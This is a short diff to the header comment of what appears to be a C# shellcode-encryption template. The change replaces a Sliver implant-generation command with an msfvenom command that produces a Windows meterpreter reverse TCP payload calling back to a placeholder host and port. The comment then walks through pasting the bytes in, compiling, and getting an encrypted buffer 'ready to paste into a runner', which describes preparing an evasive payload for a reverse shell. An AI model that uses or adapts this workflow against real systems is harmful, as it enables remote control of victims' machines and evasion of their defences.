@@ -1,7 +1,7 @@
 // =============================================================================
 // TEMPLATE — replace shellcode bytes with your msfvenom output before compiling
 //
-//   1. sliver > generate --mtls <IP>:<PORT> --format csharp --save /tmp/sc.cs
+//   1. msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f csharp -o /tmp/sc.cs
 //   2. Paste the bytes into the shellcode array below and update the byte count
 //   3. Compile and run — output is your encrypted buf, ready to paste into a runner
 // =============================================================================
